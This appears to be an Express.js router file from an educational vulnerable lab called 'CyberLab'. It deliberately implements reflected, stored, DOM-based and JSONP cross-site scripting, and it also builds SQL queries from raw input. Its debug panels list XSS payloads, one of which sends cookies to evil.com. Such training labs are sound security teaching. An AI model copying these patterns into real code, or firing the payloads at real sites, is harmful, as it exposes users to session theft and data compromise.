/**
 * VULNERABLE XSS ENDPOINTS
 * WARNING: These endpoints are INTENTIONALLY VULNERABLE
 * For demonstration of Cross-Site Scripting
 * DO NOT use in production!
 */

const express = require('express');
const db = require('../config/database');
const logger = require('../middleware/logger');
const { vulnerableAuth } = require('../middleware/auth');

const router = express.Router();

// ============================================
// REFLECTED XSS
// ============================================
router.get('/reflected', (req, res) => {
  const { search, name, message, redirect } = req.query;
  
  logger.logSensitive('XSS Reflected attempt', { 
    search, name, message, redirect,
    user_agent: req.get('User-Agent'),
    referer: req.get('Referer'),
    ip: req.ip 
  });
  
  // HTML response that reflects input without sanitization
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Busca Vulnerável - CyberLab</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .search-box { margin: 20px 0; }
        .result { background: #f0f0f0; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .warning { color: red; font-weight: bold; }
        .debug { background: #ffe6e6; padding: 10px; margin: 20px 0; }
      </style>
    </head>
    <body>
      <h1>🔍 Sistema de Busca Vulnerável</h1>
      
      <div class="search-box">
        <form method="GET">
          <input type="text" name="search" placeholder="Digite sua busca..." value="${search || ''}" size="50">
          <button type="submit">Buscar</button>
        </form>
      </div>
      
      ${search ? `
        <div class="result">
          <h2>Resultados para: ${search}</h2>
          <p>Sua busca por "<strong>${search}</strong>" retornou 0 resultados.</p>
          <p>Termo pesquisado: ${search}</p>
        </div>
      ` : ''}
      
      ${name ? `
        <div class="result">
          <h2>Olá, ${name}!</h2>
          <p>Bem-vindo(a) ao sistema, ${name}. Seu nome é: ${name}</p>
        </div>
      ` : ''}
      
      ${message ? `
        <div class="result">
          <h2>Mensagem recebida:</h2>
          <div>${message}</div>
          <p>Mensagem processada: ${message}</p>
        </div>
      ` : ''}
      
      <div class="debug">
        <h3>🐛 Debug Information (Vulnerable!)</h3>
        <p><strong>Query Parameters:</strong></p>
        <ul>
          <li>search: ${search || 'null'}</li>
          <li>name: ${name || 'null'}</li>
          <li>message: ${message || 'null'}</li>
          <li>redirect: ${redirect || 'null'}</li>
        </ul>
        
        <p><strong>XSS Examples:</strong></p>
        <ul>
          <li><code>?search=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
          <li><code>?name=&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
          <li><code>?message=&lt;svg onload="alert('XSS')"&gt;</code></li>
          <li><code>?search=&lt;iframe src="javascript:alert('XSS')"&gt;</code></li>
        </ul>
      </div>
      
      <script>
        // ⚠️ JavaScript que usa parâmetros diretamente - MUITO PERIGOSO!
        const params = new URLSearchParams(window.location.search);
        const redirect = params.get('redirect');
        
        if (redirect) {
          console.log('Redirecting to: ' + redirect);
          // DOM-based XSS possibility
          document.body.innerHTML += '<p>Redirecting to: ' + redirect + '</p>';
          
          // Timeout redirect - também vulnerável
          setTimeout(() => {
            window.location = redirect;
          }, 3000);
        }
        
        // Log de parâmetros no console - vaza informações
        console.log('Search params:', Object.fromEntries(params));
      </script>
      
      <hr>
      <p><small>CyberLab - Ambiente Educacional Vulnerável</small></p>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  res.send(htmlResponse);
});

// ============================================
// STORED XSS
// ============================================
router.post('/comments/add', async (req, res) => {
  try {
    const { name, email, comment, rating } = req.body;
    
    logger.logSensitive('XSS Stored attempt', { 
      name, email, comment, rating,
      ip: req.ip,
      user_agent: req.get('User-Agent')
    });
    
    // Insert comment directly into database WITHOUT sanitization
    const insertQuery = `
      INSERT INTO comments (name, email, comment, rating, ip_address, user_agent, created_at)
      VALUES ('${name}', '${email}', '${comment}', '${rating}', '${req.ip}', '${req.get('User-Agent')}', NOW())
    `;
    
    logger.logVulnerableQuery(insertQuery, { name, email, comment, rating }, req.ip, null);
    
    const result = await db.executeDirectQuery(insertQuery);
    
    res.json({
      success: true,
      message: 'Comentário adicionado com sucesso!',
      comment_id: result.results.insertId,
      stored_data: {
        name: name,
        email: email,
        comment: comment,
        rating: rating
      },
      debug: {
        warning: 'Comentário armazenado SEM sanitização!',
        stored_html: comment,
        query_executed: insertQuery,
        xss_examples: [
          '<script>alert("Stored XSS")</script>',
          '<img src=x onerror="alert(document.cookie)">',
          '<svg onload="alert(\'Persistent XSS\')">'
        ]
      }
    });
    
  } catch (error) {
    logger.error('Comment storage error:', error);
    
    res.status(500).json({
      success: false,
      error: error.message,
      sql_error: error.sqlMessage
    });
  }
});

// ============================================
// 🚨 VISUALIZAR COMENTÁRIOS (STORED XSS EXECUTION)
// ============================================
router.get('/comments', async (req, res) => {
  try {
    const { limit = 50, offset = 0 } = req.query;
    
    // 🚨 Buscar todos os comentários
    const selectQuery = `
      SELECT id, name, email, comment, rating, ip_address, user_agent, created_at
      FROM comments 
      ORDER BY created_at DESC 
      LIMIT ${limit} OFFSET ${offset}
    `;
    
    const result = await db.executeDirectQuery(selectQuery);
    
    // ⚠️ HTML response que renderiza comentários SEM sanitização
    const htmlResponse = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Comentários - CyberLab</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 40px; }
          .comment { border: 1px solid #ddd; margin: 20px 0; padding: 15px; border-radius: 5px; }
          .comment-header { font-weight: bold; color: #333; }
          .comment-body { margin: 10px 0; }
          .comment-meta { font-size: 12px; color: #666; }
          .rating { color: #f39c12; }
          .form-container { background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 30px; }
          .debug { background: #ffe6e6; padding: 10px; margin: 20px 0; }
        </style>
      </head>
      <body>
        <h1>💬 Sistema de Comentários Vulnerável</h1>
        
        <div class="form-container">
          <h2>Adicionar Comentário</h2>
          <form action="/api/xss/comments/add" method="POST" style="display: grid; gap: 10px; max-width: 500px;">
            <input type="text" name="name" placeholder="Seu nome" required>
            <input type="email" name="email" placeholder="Seu email" required>
            <textarea name="comment" placeholder="Seu comentário" rows="4" required></textarea>
            <select name="rating">
              <option value="1">⭐ 1 estrela</option>
              <option value="2">⭐⭐ 2 estrelas</option>
              <option value="3">⭐⭐⭐ 3 estrelas</option>
              <option value="4">⭐⭐⭐⭐ 4 estrelas</option>
              <option value="5">⭐⭐⭐⭐⭐ 5 estrelas</option>
            </select>
            <button type="submit">Enviar Comentário</button>
          </form>
        </div>
        
        <h2>📝 Comentários (${result.results.length})</h2>
        
        ${result.results.map(comment => `
          <div class="comment">
            <div class="comment-header">
              ${comment.name} (${comment.email})
              <span class="rating">${'⭐'.repeat(comment.rating)}</span>
            </div>
            <div class="comment-body">
              ${comment.comment}
            </div>
            <div class="comment-meta">
              IP: ${comment.ip_address} | 
              User-Agent: ${comment.user_agent} | 
              Data: ${comment.created_at}
            </div>
          </div>
        `).join('')}
        
        <div class="debug">
          <h3>🐛 Debug Information (Vulnerable!)</h3>
          <p><strong>Total Comments:</strong> ${result.results.length}</p>
          <p><strong>Query Executed:</strong> <code>${selectQuery}</code></p>
          <p><strong>Warning:</strong> Todos os comentários são renderizados SEM sanitização!</p>
          
          <p><strong>Stored XSS Examples to test:</strong></p>
          <ul>
            <li><code>&lt;script&gt;alert('Persistent XSS')&lt;/script&gt;</code></li>
            <li><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
            <li><code>&lt;svg onload="fetch('http://evil.com/steal?cookie='+document.cookie)"&gt;</code></li>
            <li><code>&lt;iframe src="javascript:alert('XSS from iframe')"&gt;&lt;/iframe&gt;</code></li>
          </ul>
        </div>
        
        <script>
          // ⚠️ JavaScript adicional que pode ser explorado
          window.commentData = ${JSON.stringify(result.results)};
          console.log('All comments data:', window.commentData);
          
          // Auto-refresh a cada 30 segundos para mostrar novos comments
          setTimeout(() => {
            location.reload();
          }, 30000);
        </script>
        
        <hr>
        <p><small>CyberLab - Ambiente Educacional Vulnerável</small></p>
      </body>
      </html>
    `;
    
    logger.logSensitive('Comments page accessed', { 
      comments_count: result.results.length,
      ip: req.ip 
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(htmlResponse);
    
  } catch (error) {
    logger.error('Comments display error:', error);
    
    res.status(500).json({
      success: false,
      error: error.message,
      sql_error: error.sqlMessage
    });
  }
});

// ============================================
// 🚨 XSS BASEADO EM DOM (DOM-BASED XSS)
// ============================================
router.get('/dom-xss', (req, res) => {
  // ⚠️ Página que usa JavaScript para processar parâmetros da URL
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>DOM XSS - CyberLab</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 800px; }
        .output { background: #f0f0f0; padding: 20px; margin: 20px 0; border-radius: 5px; }
        .debug { background: #ffe6e6; padding: 10px; margin: 20px 0; }
        input { padding: 8px; margin: 5px; }
        button { padding: 10px 20px; margin: 5px; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🌐 DOM-Based XSS Vulnerável</h1>
        
        <h2>Processamento de URL</h2>
        <p>Esta página processa parâmetros da URL usando JavaScript no client-side.</p>
        
        <div class="output" id="url-output">
          <!-- Conteúdo será inserido via JavaScript -->
        </div>
        
        <h2>Entrada Dinâmica</h2>
        <input type="text" id="user-input" placeholder="Digite algo...">
        <button onclick="processInput()">Processar</button>
        
        <div class="output" id="input-output">
          <!-- Conteúdo será inserido via JavaScript -->
        </div>
        
        <h2>Hash Fragment Processing</h2>
        <p>Mude o hash da URL (ex: #&lt;script&gt;alert('XSS')&lt;/script&gt;)</p>
        <div class="output" id="hash-output">
          <!-- Conteúdo será inserido via JavaScript -->
        </div>
        
        <div class="debug">
          <h3>🐛 Debug Information</h3>
          <p><strong>Current URL:</strong> <span id="current-url"></span></p>
          <p><strong>Hash:</strong> <span id="current-hash"></span></p>
          <p><strong>Search:</strong> <span id="current-search"></span></p>
          
          <p><strong>DOM XSS Examples:</strong></p>
          <ul>
            <li><code>?data=&lt;img src=x onerror="alert('DOM XSS')"&gt;</code></li>
            <li><code>#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
            <li><code>?callback=alert&amp;data=XSS</code></li>
            <li><code>?html=&lt;svg onload="alert('XSS')"&gt;</code></li>
          </ul>
        </div>
      </div>
      
      <script>
        // ⚠️ Função que processa input sem sanitização - VULNERÁVEL!
        function processInput() {
          const input = document.getElementById('user-input').value;
          const output = document.getElementById('input-output');
          
          // DOM XSS vulnerável - inserção direta
          output.innerHTML = '<h3>Resultado:</h3><p>' + input + '</p>';
          
          // Log no console
          console.log('Input processado:', input);
        }
        
        // ⚠️ Processar parâmetros da URL - VULNERÁVEL!
        function processURL() {
          const params = new URLSearchParams(window.location.search);
          const output = document.getElementById('url-output');
          
          let content = '<h3>Parâmetros da URL:</h3>';
          
          // Processar cada parâmetro SEM sanitização
          params.forEach((value, key) => {
            content += '<p><strong>' + key + ':</strong> ' + value + '</p>';
          });
          
          // Parâmetros especiais
          if (params.get('data')) {
            content += '<div>Data: ' + params.get('data') + '</div>';
          }
          
          if (params.get('html')) {
            content += '<div>' + params.get('html') + '</div>';
          }
          
          if (params.get('callback')) {
            content += '<div>Callback: ' + params.get('callback') + '</div>';
            
            // Execução de callback - MUITO PERIGOSO!
            try {
              const callback = params.get('callback');
              if (callback && typeof window[callback] === 'function') {
                window[callback](params.get('data') || 'XSS Test');
              }
            } catch (e) {
              console.log('Callback error:', e);
            }
          }
          
          output.innerHTML = content;
          
          // Update debug info
          document.getElementById('current-url').textContent = window.location.href;
          document.getElementById('current-search').textContent = window.location.search;
        }
        
        // ⚠️ Processar hash fragment - VULNERÁVEL!
        function processHash() {
          const hash = window.location.hash.substring(1); // Remove #
          const output = document.getElementById('hash-output');
          
          if (hash) {
            output.innerHTML = '<h3>Hash Fragment:</h3><div>' + decodeURIComponent(hash) + '</div>';
          }
          
          document.getElementById('current-hash').textContent = window.location.hash;
        }
        
        // ⚠️ Event listeners que processam mudanças - VULNERÁVEIS!
        window.addEventListener('hashchange', processHash);
        window.addEventListener('popstate', processURL);
        
        // Processar na carga da página
        document.addEventListener('DOMContentLoaded', () => {
          processURL();
          processHash();
        });
        
        // ⚠️ Função global para demonstrar callback XSS
        window.alert = function(msg) {
          console.log('Alert interceptado:', msg);
          const div = document.createElement('div');
          div.style.cssText = 'position:fixed;top:10px;left:10px;background:red;color:white;padding:20px;z-index:9999';
          div.innerHTML = 'XSS Executado: ' + msg;
          document.body.appendChild(div);
          setTimeout(() => div.remove(), 3000);
        };
        
        // ⚠️ Dados globais expostos
        window.vulnerableData = {
          version: 'CyberLab 2.0',
          debug: true,
          allowScripts: true
        };
      </script>
    </body>
    </html>
  `;
  
  logger.logSensitive('DOM XSS page accessed', {
    query: req.query,
    referer: req.get('Referer'),
    ip: req.ip
  });
  
  res.setHeader('Content-Type', 'text/html');
  res.send(htmlResponse);
});

// ============================================
// 🚨 ENDPOINT JSON COM XSS (JSONP VULNERÁVEL)
// ============================================
router.get('/jsonp', (req, res) => {
  const { callback, data, format } = req.query;
  
  logger.logSensitive('JSONP XSS attempt', { callback, data, format, ip: req.ip });
  
  const responseData = {
    success: true,
    message: 'JSONP Response',
    data: data || 'test data',
    timestamp: new Date(),
    client_ip: req.ip,
    user_agent: req.get('User-Agent')
  };
  
  if (callback) {
    // ⚠️ JSONP vulnerável - callback não sanitizado
    const jsonpResponse = `${callback}(${JSON.stringify(responseData)})`;
    
    res.setHeader('Content-Type', 'application/javascript');
    res.send(jsonpResponse);
  } else {
    // Resposta JSON normal
    res.json({
      ...responseData,
      debug: {
        hint: 'Add ?callback=alert to trigger JSONP XSS',
        examples: [
          '?callback=alert',
          '?callback=console.log',
          '?callback=eval&data=alert("XSS")'
        ]
      }
    });
  }
});

module.exports = router;